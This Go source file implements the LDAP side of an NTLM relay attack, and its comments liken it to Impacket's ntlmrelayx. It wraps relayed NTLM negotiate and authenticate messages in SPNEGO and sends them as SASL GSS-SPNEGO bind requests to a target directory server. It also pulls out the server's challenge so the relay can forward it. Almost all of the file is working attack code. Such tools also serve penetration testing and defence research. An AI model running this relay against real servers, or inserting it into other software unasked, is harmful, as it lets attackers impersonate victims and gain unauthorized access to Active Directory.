package commands

import (
	"bytes"
	"fmt"
	"net"
	"time"

	ber "github.com/go-asn1-ber/asn1-ber"
)

// LDAP NTLM relay bind implementation using SASL/GSS-SPNEGO.
//
// Uses standard SASL bind (RFC 4513 §5.2.1) with GSS-SPNEGO mechanism:
//   Step 1: BindRequest SASL { "GSS-SPNEGO", SPNEGO(Type1) } → saslBindInProgress + SPNEGO(Type2)
//   Step 2: BindRequest SASL { "GSS-SPNEGO", SPNEGO(Type3) } → success (resultCode=0)
//
// This is the same mechanism used by ldapsearch, Impacket ntlmrelayx, and
// Windows LDAP clients for NTLM authentication over LDAP.

const (
	ldapAppBindRequest  = 0
	ldapAppBindResponse = 1
)

type ldapRelayConn struct {
	conn  net.Conn
	msgID int64
}

func ldapRelayDial(target string, port int, timeout time.Duration) (*ldapRelayConn, error) {
	addr := net.JoinHostPort(target, fmt.Sprintf("%d", port))
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return nil, fmt.Errorf("connect to %s: %w", addr, err)
	}
	_ = conn.SetDeadline(time.Now().Add(timeout))
	return &ldapRelayConn{conn: conn, msgID: 1}, nil
}

func (lc *ldapRelayConn) close() {
	lc.conn.Close()
}

// negotiate sends an LDAP SASL BindRequest with GSS-SPNEGO wrapping the
// NTLM Type 1 message and returns the NTLM Type 2 challenge.
func (lc *ldapRelayConn) negotiate(ntlmType1 []byte) ([]byte, error) {
	spnegoToken := spnegoWrapNegTokenInit(ntlmType1)
	return lc.saslBind("GSS-SPNEGO", spnegoToken)
}

// authenticate sends an LDAP SASL BindRequest with GSS-SPNEGO wrapping the
// NTLM Type 3 message and returns nil on success.
func (lc *ldapRelayConn) authenticate(ntlmType3 []byte) error {
	spnegoToken := spnegoWrapNegTokenResp(ntlmType3)

	packet := lc.buildSASLBindRequest("GSS-SPNEGO", spnegoToken)

	_, err := lc.conn.Write(packet.Bytes())
	if err != nil {
		return fmt.Errorf("write authenticate: %w", err)
	}

	respPacket, err := ber.ReadPacket(lc.conn)
	if err != nil {
		return fmt.Errorf("read authenticate response: %w", err)
	}

	resultCode, errMsg := lc.parseBindResult(respPacket)
	if resultCode != 0 {
		return fmt.Errorf("LDAP bind failed (code %d): %s", resultCode, errMsg)
	}
	return nil
}

// saslBind sends a SASL BindRequest and extracts the NTLM token from the response.
func (lc *ldapRelayConn) saslBind(mechanism string, credentials []byte) ([]byte, error) {
	packet := lc.buildSASLBindRequest(mechanism, credentials)

	_, err := lc.conn.Write(packet.Bytes())
	if err != nil {
		return nil, fmt.Errorf("write SASL bind: %w", err)
	}

	respPacket, err := ber.ReadPacket(lc.conn)
	if err != nil {
		return nil, fmt.Errorf("read SASL bind response: %w", err)
	}

	return lc.extractBindResponseCreds(respPacket)
}

// buildSASLBindRequest constructs an LDAP BindRequest with SASL auth:
//   SEQUENCE { msgID, APPLICATION[0] { version=3, name="", auth=[3] { mechanism, credentials } } }
func (lc *ldapRelayConn) buildSASLBindRequest(mechanism string, credentials []byte) *ber.Packet {
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, lc.msgID, "MessageID"))
	lc.msgID++

	bindReq := ber.Encode(ber.ClassApplication, ber.TypeConstructed, ldapAppBindRequest, nil, "Bind Request")
	bindReq.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindReq.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Name"))

	// SASL auth: context [3] CONSTRUCTED { mechanism OCTET_STRING, credentials OCTET_STRING }
	auth := ber.Encode(ber.ClassContext, ber.TypeConstructed, 3, nil, "SASL Auth")
	auth.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, mechanism, "Mechanism"))

	creds := ber.Encode(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, nil, "Credentials")
	creds.Value = credentials
	_, _ = creds.Data.Write(credentials)
	auth.AppendChild(creds)

	bindReq.AppendChild(auth)
	packet.AppendChild(bindReq)

	return packet
}

func (lc *ldapRelayConn) extractBindResponseCreds(packet *ber.Packet) ([]byte, error) {
	if len(packet.Children) < 2 {
		return nil, fmt.Errorf("malformed LDAP response: expected 2+ children, got %d", len(packet.Children))
	}

	bindResp := packet.Children[1]
	if bindResp.Tag != ldapAppBindResponse {
		return nil, fmt.Errorf("expected BindResponse (tag 1), got tag %d", bindResp.Tag)
	}

	// BindResponse: { resultCode, matchedDN, diagnosticMessage, [7]serverSaslCreds? }
	for _, child := range bindResp.Children {
		if child.ClassType == ber.ClassContext && child.Tag == 7 {
			creds := child.ByteValue
			if len(creds) == 0 {
				creds = child.Data.Bytes()
			}
			if len(creds) > 0 {
				return creds, nil
			}
		}
	}

	resultCode, errMsg := lc.parseBindResult(packet)
	if resultCode == 14 {
		// saslBindInProgress — scan all children for NTLM signature
		for _, child := range bindResp.Children {
			data := child.ByteValue
			if len(data) == 0 {
				data = child.Data.Bytes()
			}
			if len(data) >= 8 && bytes.HasPrefix(data, sniffNTLMSig) {
				return data, nil
			}
		}
		return nil, fmt.Errorf("saslBindInProgress but no NTLM challenge found in %d children", len(bindResp.Children))
	}

	return nil, fmt.Errorf("no server SASL creds in bind response (resultCode=%d, msg=%s)", resultCode, errMsg)
}

func (lc *ldapRelayConn) parseBindResult(packet *ber.Packet) (int64, string) {
	if len(packet.Children) < 2 {
		return -1, "malformed response"
	}
	bindResp := packet.Children[1]
	if len(bindResp.Children) < 3 {
		return -1, "malformed bind response"
	}

	resultCode, ok := bindResp.Children[0].Value.(int64)
	if !ok {
		return -1, "cannot parse result code"
	}

	errMsg := ""
	if bindResp.Children[2].Value != nil {
		errMsg = fmt.Sprintf("%v", bindResp.Children[2].Value)
	}

	return resultCode, errMsg
}
